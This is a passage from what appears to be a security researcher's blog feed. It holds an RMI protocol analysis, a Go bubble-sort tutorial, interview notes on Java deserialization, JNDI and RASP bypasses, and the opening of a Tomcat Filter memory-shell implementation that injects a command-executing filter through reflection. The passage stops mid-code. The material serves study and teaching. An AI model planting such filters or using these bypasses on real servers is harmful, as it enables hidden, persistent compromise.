4322806).</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="type">int</span> <span class="variable">originalSoTimeout</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        originalSoTimeout = sock.getSoTimeout();</span><br><span class="line">                        sock.setSoTimeout(handshakeTimeout);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="comment">// if we fail to set this, ignore and proceed anyway</span></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span></span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(conn.getInputStream());</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">ack</span> <span class="operator">=</span> in.readByte();</span><br><span class="line">                    <span class="keyword">if</span> (ack != TransportConstants.ProtocolAck) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConnectIOException</span>(</span><br><span class="line">                            ack == TransportConstants.ProtocolNack ?</span><br><span class="line">                            <span class="string">&quot;JRMP StreamProtocol not supported by server&quot;</span> :</span><br><span class="line">                            <span class="string">&quot;non-JRMP server at remote endpoint&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">String</span> <span class="variable">suggestedHost</span> <span class="operator">=</span> in.readUTF();</span><br><span class="line">                    <span class="type">int</span>    <span class="variable">suggestedPort</span> <span class="operator">=</span> in.readInt();</span><br><span class="line">                    <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                        TCPTransport.tcpLog.log(Log.VERBOSE,</span><br><span class="line">                            <span class="string">&quot;server suggested &quot;</span> + suggestedHost + <span class="string">&quot;:&quot;</span> +</span><br><span class="line">                            suggestedPort);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// set local host name, if unknown</span></span><br><span class="line">                    TCPEndpoint.setLocalHost(suggestedHost);</span><br><span class="line">                    <span class="comment">// do NOT set the default port, because we don&#x27;t</span></span><br><span class="line">                    <span class="comment">// know if we can&#x27;t listen YET...</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// write out default endpoint to match protocol</span></span><br><span class="line">                    <span class="comment">// (but it serves no purpose)</span></span><br><span class="line">                    <span class="type">TCPEndpoint</span> <span class="variable">localEp</span> <span class="operator">=</span></span><br><span class="line">                        TCPEndpoint.getLocalEndpoint(<span class="number">0</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                    out.writeUTF(localEp.getHost());</span><br><span class="line">                    out.writeInt(localEp.getPort());</span><br><span class="line">                    <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                        TCPTransport.tcpLog.log(Log.VERBOSE, <span class="string">&quot;using &quot;</span> +</span><br><span class="line">                            localEp.getHost() + <span class="string">&quot;:&quot;</span> + localEp.getPort());</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * After JRMP handshake, set socket read timeout to value</span></span><br><span class="line"><span class="comment">                     * configured for the rest of the lifetime of the</span></span><br><span class="line"><span class="comment">                     * connection.  <span class="doctag">NOTE:</span> this timeout, if configured to a</span></span><br><span class="line"><span class="comment">                     * finite duration, places an upper bound on the time</span></span><br><span class="line"><span class="comment">                     * that a remote method call is permitted to execute.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         * If socket factory had set a non-zero timeout on its</span></span><br><span class="line"><span class="comment">                         * own, then restore it instead of using the property-</span></span><br><span class="line"><span class="comment">                         * configured value.</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">                        sock.setSoTimeout((originalSoTimeout != <span class="number">0</span> ?</span><br><span class="line">                                           originalSoTimeout :</span><br><span class="line">                                           responseTimeout));</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="comment">// if we fail to set this, ignore and proceed anyway</span></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    out.flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    conn.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ex) &#123;&#125;</span><br><span class="line">                <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RemoteException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (RemoteException) e;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConnectIOException</span>(</span><br><span class="line">                        <span class="string">&quot;error during JRMP connection establishment&quot;</span>, e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                conn = multiplexer.openConnection();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                    usingMultiplexer = <span class="literal">false</span>;</span><br><span class="line">                    multiplexer = <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConnectIOException</span>(</span><br><span class="line">                    <span class="string">&quot;error opening virtual connection &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;over multiplexed connection&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这一段代码就长的有点离大谱了，主要关注两个<code>out.flush</code>就是这行代码发起了请求，前面都是些前戏。。。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b7ce319853f0a81f9b6423e73422a923.png" alt="在这里插入图片描述"><br>216与217行的代码已经很清楚了，新建一个socket，然后进行TCP连接，也就是进行三次握手，217执行完毕后，我们就可以使用wireshark看到：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ac74b906c3c7167d461247f0e5910147.png" alt="在这里插入图片描述"><br>妥妥的握手报文。<br>然后就是创建一个使用<code>conn</code>创建一个输出流，然后将其封装为数据输出流，然后再为输出流设置JRMI幻数与版本：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5d128b917e925efdae34ee1ccde566ad.png" alt="在这里插入图片描述"><br>看一下协议幻数与版本号分别是多少：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d5ea58732ddac83242ae8649d58cf580.png" alt="在这里插入图片描述"></p>
<p>然后判断连接是否可重用，嗯，我看过了，是可重用的，所以又给输出流写了<code>TransportConstants.StreamProtocol</code>，这个值为<code>0x4b</code><br>这个编号我还好奇去转了一下码：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c21e1dc5f77996f14dd88261428f5953.png" alt="在这里插入图片描述"><br>然后我去查了一下协议号：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/33435cfb0a4de3e39f01e53c38da88ea.png" alt="在这里插入图片描述"><br>这75是个什么鬼。。。对不上啊，只能解释为这两不是一个概念了。。。嗯，肯定不是一个概念，在<code>out.flush</code>发包后，我们看看看wireshark抓到的包：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c85f4ddc3b459144609138ebcdd56296.png" alt="在这里插入图片描述"><br>看红框里面的16进制值为<code>4a524d4900024b</code>，就是协议幻数+版本号+流协议标识，知道了这个，我们就有了伪造RMI协议的第一个关键信息了。。。。。<br>看看对响应的处理：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/fefe420814025b84e8d9a10f36c5b8aa.png" alt="在这里插入图片描述"><br>首先封装了一个<code>DataInputStream</code>流对象，然后从输入流里面读了1个字节出来作为协议确认码ack，此处为<code>78</code>,然后判断ack是否等于<code>TransportConstants.ProtocolAck</code>，即<code>0x4e</code>，翻译为十进制就是78，这里是相等的。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1818e586dbb2a51d0291e31e5fdf1f7e.png" alt="在这里插入图片描述"><br>然后继续读输入流得到<code>suggestedHost</code>与<code>suggestedPort</code><br>然后设置<code>TCPEndpoint</code>的host为获取到的<code>suggestedHost</code>，<code>localhost</code>也为获取到的<code>suggestedHost</code>，然后创建一个本地端点，通过这个端点获取主机与端口设置给输出流，然后out.flush将缓冲区的数据发送出去，通过wireshark抓包<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ff74eef65b4fdf5f6aad80a54a0bd84e.png" alt="在这里插入图片描述"><br>看到这里发送的请求报文中确实有ip地址，但是没有看到端口啊，哪里除了问题？<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a3402e3f023d26c3aa3f42a79ae037dd.png" alt="在这里插入图片描述"><br>注意到这儿获取本地端点的时候传入的端口就是0，抓包看到的请求为0也算正常。<br>这里就获取到了伪造RMI协议的第二个关键数据。。。。。这是越来越刑啊。。。。。</p>
<p>总之到目前为止，发送RMI请求的连接已经获取完毕的，接下来的工作就是客户端携带要查询的key去注册中心查询是否存在对应的对象，然后注册中心将返回一个存根给客户端，然后客户端利用这个存根再去访问服务器的skeleton，服务器骨架访问服务器查看是否存在这样一个方法，根据客户端发送过来的方法名与参数执行对应的方法，然后将执行的结果返回给客户端由客户端存根接收然后转发给客户端。<br>好了今天时间比较晚了，预知后事如何，请听下回分解。。。。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>冒泡排序调优 go语言</title>
    <url>/archives/7473afbd.html</url>
    <content><![CDATA[<h1 id="常规做法"><a href="#常规做法" class="headerlink" title="常规做法"></a>常规做法</h1><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">	origin := [...]<span class="type">int</span>&#123;<span class="number">1</span>,<span class="number">223</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">34</span>,<span class="number">3545</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">23</span>,<span class="number">56</span>,<span class="number">78</span>,<span class="number">89</span>,<span class="number">345</span>,<span class="number">2377</span>,<span class="number">3457</span>,<span class="number">6777</span>&#125;</span><br><span class="line">	fmt.Println(origin)</span><br><span class="line">	<span class="comment">//冒泡排序 与调优</span></span><br><span class="line">	<span class="comment">//lastExchangeIndex := 0</span></span><br><span class="line">	<span class="comment">//sortBorder := 0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i&lt;<span class="built_in">len</span>(origin);i++&#123;</span><br><span class="line">		fmt.Println(i)</span><br><span class="line">		<span class="comment">//isSorted := false</span></span><br><span class="line">		<span class="keyword">for</span> j := <span class="built_in">len</span>(origin)<span class="number">-1</span>; j&gt;i;j--&#123;</span><br><span class="line">			<span class="keyword">if</span> origin[j]&lt;origin[j<span class="number">-1</span>] &#123;</span><br><span class="line">				tmp := origin[j<span class="number">-1</span>]</span><br><span class="line">				origin[j<span class="number">-1</span>] = origin[j]</span><br><span class="line">				origin[j] = tmp</span><br><span class="line">				<span class="comment">//isSorted = true</span></span><br><span class="line">				<span class="comment">//lastExchangeIndex = j</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//sortBorder =lastExchangeIndex</span></span><br><span class="line">		<span class="comment">//if !isSorted&#123;</span></span><br><span class="line">		<span class="comment">//	break</span></span><br><span class="line">		<span class="comment">//&#125;</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fmt.Println(origin)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="一次优化"><a href="#一次优化" class="headerlink" title="一次优化"></a>一次优化</h1><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">	origin := [...]<span class="type">int</span>&#123;<span class="number">1</span>,<span class="number">223</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">34</span>,<span class="number">3545</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">23</span>,<span class="number">56</span>,<span class="number">78</span>,<span class="number">89</span>,<span class="number">345</span>,<span class="number">2377</span>,<span class="number">3457</span>,<span class="number">6777</span>&#125;</span><br><span class="line">	fmt.Println(origin)</span><br><span class="line">	<span class="comment">//冒泡排序 与调优</span></span><br><span class="line">	<span class="comment">//lastExchangeIndex := 0</span></span><br><span class="line">	<span class="comment">//sortBorder := 0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i&lt;<span class="built_in">len</span>(origin);i++&#123;</span><br><span class="line">		fmt.Println(i)</span><br><span class="line">		isSorted := <span class="literal">false</span></span><br><span class="line">		<span class="keyword">for</span> j := <span class="built_in">len</span>(origin)<span class="number">-1</span>; j&gt;i;j--&#123;</span><br><span class="line">			<span class="keyword">if</span> origin[j]&lt;origin[j<span class="number">-1</span>] &#123;</span><br><span class="line">				tmp := origin[j<span class="number">-1</span>]</span><br><span class="line">				origin[j<span class="number">-1</span>] = origin[j]</span><br><span class="line">				origin[j] = tmp</span><br><span class="line">				isSorted = <span class="literal">true</span></span><br><span class="line">				<span class="comment">//lastExchangeIndex = j</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//sortBorder =lastExchangeIndex</span></span><br><span class="line">		<span class="keyword">if</span> !isSorted&#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fmt.Println(origin)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当某一次排列没有发生位置交换时证明已经完成排序</p>
<h1 id="二次调优"><a href="#二次调优" class="headerlink" title="二次调优"></a>二次调优</h1><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">	origin := [...]<span class="type">int</span>&#123;<span class="number">1</span>,<span class="number">223</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">34</span>,<span class="number">3545</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">23</span>,<span class="number">56</span>,<span class="number">78</span>,<span class="number">89</span>,<span class="number">345</span>,<span class="number">2377</span>,<span class="number">3457</span>,<span class="number">6777</span>&#125;</span><br><span class="line">	fmt.Println(origin)</span><br><span class="line">	<span class="comment">//冒泡排序 与调优</span></span><br><span class="line">	lastExchangeIndex := <span class="number">0</span></span><br><span class="line">	sortBorder := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := sortBorder; i&lt;<span class="built_in">len</span>(origin);i++&#123;</span><br><span class="line">		fmt.Println(i)</span><br><span class="line">		isSorted := <span class="literal">false</span></span><br><span class="line">		<span class="keyword">for</span> j := <span class="built_in">len</span>(origin)<span class="number">-1</span>; j&gt;i;j--&#123;</span><br><span class="line">			<span class="keyword">if</span> origin[j]&lt;origin[j<span class="number">-1</span>] &#123;</span><br><span class="line">				tmp := origin[j<span class="number">-1</span>]</span><br><span class="line">				origin[j<span class="number">-1</span>] = origin[j]</span><br><span class="line">				origin[j] = tmp</span><br><span class="line">				isSorted = <span class="literal">true</span></span><br><span class="line">				lastExchangeIndex = j</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		sortBorder =lastExchangeIndex</span><br><span class="line">		<span class="keyword">if</span> !isSorted&#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fmt.Println(origin)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在一次调优的基础上记录上一次排列最后一次发生交换的位置，那么之后的位置都是没有发生交换的，所以下一轮交换从上一轮最后一次调优的位置开始</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>冒泡排序</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>安全研究员面试题拾遗（Web + 二进制方向）</title>
    <url>/archives/e1ac77d.html</url>
    <content><![CDATA[<h1 id="Web方向"><a href="#Web方向" class="headerlink" title="Web方向"></a>Web方向</h1><table>
<thead>
<tr>
<th>题目</th>
<th>回答</th>
</tr>
</thead>
<tbody><tr>
<td>JAVA内存马</td>
<td>Servlet-api  Valve   重点是获取StandardContext对象，然后根据servlet规范调用指定的方法动态注册对应的项目               Spring Controller Interpretor</td>
</tr>
<tr>
<td>Weblogic反序列化</td>
<td>T3协议 7001端口 握手包会返回版本信息 正式的协议开头是数据长度，让后是一些其他信息，然后就是一系列的反序列化数据，aced开头的，然后我们需要替换其中一部分或者在中间插入一部分就可完成反序列化</td>
</tr>
<tr>
<td>JAVA反序列化</td>
<td>静态代码块 实例代码块 构造方法</td>
</tr>
<tr>
<td>FastJSON反序列化</td>
<td>反序列化过程中setter会被自动调用，而在parseObject方发生getter方法也会被调用，fastjson又提供了autoType功能用以指定要发序列化的具体类，从而导致了漏洞的发生，典型的利用链为 JdbcRowImpl TemplateImpl，最新的1.2.80绕过，利用的是expactClass&#x3D;Thrownable.class，找到Thrownable的子类就可以完美染过autotypeSupport判断，我们还可以通过AutoCloseable类完成绕过，该类本身在白名单中，在反序列化过程中会在getSeeAll方法是执行失败，从而继续扫描然后会将第二个@type的类作为目标类，如果这个类继承了AutoCloseable类，那么就可以绕过自动类型开启的判断，那么问题就是找到一个内置的实现了该类的子类且有危险的方法被执行</td>
</tr>
<tr>
<td>Log4J2漏洞原理</td>
<td>递归解析用来绕WAF log4j2默认开启了lookup支持，那么就会调用MessagePatternConverter去解析从配置文件、options、message中传入的参数，如果遇到了${就会去找}如果找到了就会将中间的内容通过StrSubstitutor进行解析，在解析时会通过冒号分割这部分内容，通过冒号前面的内容映射对应的处理逻辑，这部分其实是通过org.apache.logging.log4j.core.lookup.Interpolator作为代理类通过传入不同的参数调用不同的方法来实现不同的处理逻辑，而JNID恰巧就被提供了支持，也就导致了漏洞的发生</td>
</tr>
<tr>
<td>Spring Bean RCE漏洞原理</td>
<td>参数映射，主要在进行参数映射的时候会调用的对应的setter方法为进行参数绑定，而在JAVA的Objects方法中存在一个特殊的getClass方法用来获取当前类的Class实例，那么我们就可以通国传入Class&#x3D;xxx的方式为Class实例赋值，而通过Class实例又可以获得类加载器ClassLoader，在类加载器中又有一个URLS属性所以就有了Class.Classloader.URLs[0]，这是老的版本的漏洞成因，最新的绕过是在JDK9中Class中提供了Module属性可以用来获取到类加载器从而导致了漏洞的发生</td>
</tr>
<tr>
<td>JAVA assait与ASM的区别</td>
<td>ClassPool  ClassVisitor ClassReader ClassWriter</td>
</tr>
<tr>
<td>JAVA Agent</td>
<td>premain agentman Instrumentation ClassFileTransformer</td>
</tr>
<tr>
<td>JAVA动态代理</td>
<td>getProxyClass0—valueFactory.apply–generateClassFile—defineClass0</td>
</tr>
<tr>
<td>JAVA XXE漏洞</td>
<td>XMLReader等</td>
</tr>
<tr>
<td>JNDI注入原理</td>
<td>lookup参数可控，云云，可以详细分析过程</td>
</tr>
<tr>
<td>高版本JDK如何进行JNDI注入</td>
<td>Tomcat BeanFactory，codebase</td>
</tr>
<tr>
<td>JEP290了解吗</td>
<td>类黑名单 内置、自定义安全策略</td>
</tr>
<tr>
<td>讲讲Hadoop</td>
<td>hdfs MapReduce HBase namenode datanode client ResourceManager</td>
</tr>
<tr>
<td>go会吗</td>
<td>会，可以写一般的项目</td>
</tr>
<tr>
<td>Shiro反序列化</td>
<td>AES秘钥硬编码， CBC填充提示攻击</td>
</tr>
<tr>
<td>Shiro设计模式</td>
<td>单例模式SecurityManager 简单工厂模式</td>
</tr>
<tr>
<td>Shiro未授权访问</td>
<td>有一个未授权的拦截器，path中对;处理不当导致截断，结合spring boot的url处理缺陷导致漏洞，还有一个ant风格导致的未授权</td>
</tr>
<tr>
<td>有没有在原有漏洞基础上延伸</td>
<td>完成了fastjson最新rce漏洞的分析</td>
</tr>
<tr>
<td>如何防御JAVA反序列化</td>
<td>重写类加载器、重写readObject方法。。。JEP290</td>
</tr>
<tr>
<td>内网不出网</td>
<td>不讲工具，将原理，无非是监听、反连、正连</td>
</tr>
<tr>
<td>Ms068原理</td>
<td>忘求了，也是kerburnets协议的漏洞</td>
</tr>
<tr>
<td>了解哪些JAVA框架</td>
<td>Spring Spring Boot spring mvc shiro struts2 云云</td>
</tr>
<tr>
<td>讲讲Spring</td>
<td>IOC 与AOP，DI 构造方法注入与setter注入，AOP，动态代理，横切关注点、切面、领域等概念</td>
</tr>
<tr>
<td>了解哪些PHP框架</td>
<td>tp</td>
</tr>
<tr>
<td>最近跟过哪些漏洞</td>
<td>fastjson vmware workspace    spring security manager</td>
</tr>
<tr>
<td>JAVA类型机制</td>
<td>瞎几把问，根本就没这玩意儿，你是要问类加载机制还是强弱类型？我看自己都没搞清楚</td>
</tr>
<tr>
<td>如何做源码审计</td>
<td>工具扫、第三方依赖、过滤器、拦截器、找对应类型漏洞的关键字，跟踪调用链</td>
</tr>
<tr>
<td>任意文件上传漏洞怎么找</td>
<td>找关键字mutipart FileInputStream FIle nio类型的Writers与Readers等</td>
</tr>
<tr>
<td>过滤器与拦截器的区别</td>
<td>以前端调度器为转折点，在其前面被称为过滤器，过滤器是servlet的概念，在tomcat中依附在pipeline上，拦截器是spring中的概念，其在前端控制器之后请求正式到达servlet的前后被执行</td>
</tr>
<tr>
<td>挖过哪些大的开源软件的漏洞</td>
<td>没挖过</td>
</tr>
<tr>
<td>如何提高log4j2 shell漏洞的检测效率</td>
<td>多线程 高并发 多次请求一次验证等</td>
</tr>
<tr>
<td>如何提高log4j2漏洞验证PoC的准确性</td>
<td>你猜</td>
</tr>
<tr>
<td>xlst注入</td>
<td></td>
</tr>
<tr>
<td>有一个java站点的webshell，翻遍了所有配置文件都没有翻到数据库连接信息，问这些信息可能在哪里</td>
<td>环境变量或者内存中或者其他的数据库里</td>
</tr>
<tr>
<td>spring booot站点暴露了一些endpoint，如env文件泄漏，但是用户名密码是*** 如何获取明文</td>
<td>heepdump  利用一些其他的依赖</td>
</tr>
<tr>
<td>.net序列化</td>
<td>不会</td>
</tr>
<tr>
<td>反序列化攻击不成功的原因</td>
<td>jdk版本不允许，配置了jep290策略，内网不出网，serializationuid不匹配</td>
</tr>
<tr>
<td>jndi高版本如何绕过</td>
<td>反序列化的本质需要我们要反序列化的类在目标本地存在，若有一个类是业务系统必须使用的类，那么该类就不可能出现在黑名单中，自然就可以被用来进行反序列化利用，如tomcat中的 BeanFactory类</td>
</tr>
<tr>
<td>rasp如何绕过</td>
<td>另起一个新的进程 使用jni hook掉rasp hook sink点的函数</td>
</tr>
<tr>
<td>fastjson如何绕过</td>
<td>unicode  hex  短划线空格等</td>
</tr>
<tr>
<td>如何挖掘未授权漏洞</td>
<td>白盒与黑盒</td>
</tr>
<tr>
<td>有webshell 可以执行任意java代码，如何查看web项目绝对路径</td>
<td>直接执行命令netstat 查看pid  lsof查看关联文件  直接翻配置文件  查看classpath</td>
</tr>
</tbody></table>
<h1 id="二进制方向【Learning】"><a href="#二进制方向【Learning】" class="headerlink" title="二进制方向【Learning】"></a>二进制方向【Learning】</h1><table>
<thead>
<tr>
<th>题目</th>
<th>回答</th>
</tr>
</thead>
<tbody><tr>
<td>SEH是什么</td>
<td></td>
</tr>
<tr>
<td>讲讲DEP</td>
<td></td>
</tr>
<tr>
<td>Canary原理、绕过等</td>
<td></td>
</tr>
<tr>
<td>堆溢出漏洞原理</td>
<td></td>
</tr>
<tr>
<td>栈溢出漏洞原理</td>
<td></td>
</tr>
<tr>
<td>挖掘过哪些商业产品漏洞</td>
<td></td>
</tr>
<tr>
<td>用过哪些调试器</td>
<td></td>
</tr>
<tr>
<td>fast bin  small bin  large bin unsorted bin异同，chunk什么时候进入unsorted bin</td>
<td></td>
</tr>
<tr>
<td>ROP、SROP</td>
<td></td>
</tr>
<tr>
<td>calloc 与malloc的异同</td>
<td></td>
</tr>
<tr>
<td>Windows有哪些组件</td>
<td></td>
</tr>
<tr>
<td>多进程如何保护数据</td>
<td>锁….</td>
</tr>
<tr>
<td>CPU调度算法</td>
<td>时间片轮训、优先级、先到先服务、最短时间优先等算法</td>
</tr>
<tr>
<td>三种函数调用约定的异同</td>
<td></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>安全研究</tag>
        <tag>Web</tag>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title>手写一个Tomcat Filter类型内存马</title>
    <url>/archives/f0f0aa4f.html</url>
    <content><![CDATA[<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//            获取StandardContext对象</span></span><br><span class="line">            System.out.println(<span class="string">&quot;获取StandardContext对象&quot;</span>);</span><br><span class="line"><span class="comment">//            Field request = req.getClass().getDeclaredField(&quot;request&quot;);</span></span><br><span class="line"><span class="comment">//            request.setAccessible(true);</span></span><br><span class="line"><span class="comment">//            Request request1 = (Request) request.get(request);</span></span><br><span class="line"><span class="comment">//            StandardContext context1 = (StandardContext) request1.getContext();</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext1</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            context = ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context2</span> <span class="operator">=</span> ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext1);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">context1</span> <span class="operator">=</span> (StandardContext) context2.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">//            将EvilFilter添加到FilterDef</span></span><br><span class="line">            System.out.println(<span class="string">&quot;将EvilFilter添加到FilterDef&quot;</span>);</span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">             <span class="type">Filter</span> <span class="variable">evilFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>()&#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">                    chain.doFilter(request, response);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="meta">@Override</span></span><br><span class="line">                 <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"><span class="comment">//                     init方法必须写，不然会报错</span></span><br><span class="line">                 &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="meta">@Override</span></span><br><span class="line">                 <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//                    destory方法必须写，不然会报错</span></span><br><span class="line"></span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;;</span><br><span class="line">            filterDef.setFilter(evilFilter);</span><br><span class="line">            <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;evil&quot;</span>;</span><br><span class="line">            filterDef.setFilterName(filterName);</span><br><span class="line">            filterDef.setFilterClass(evilFilter.getClass().getName());</span><br><span class="line">            <span class="comment">//将FilterDef添加到FilterDefs</span></span><br><span class="line">            System.out.println(<span class="string">&quot;将FilterDef添加到FilterDefs&quot;</span>);</span><br><span class="line">            context1.addFilterDef(filterDef);</span><br><span class="line"><span class="comment">//            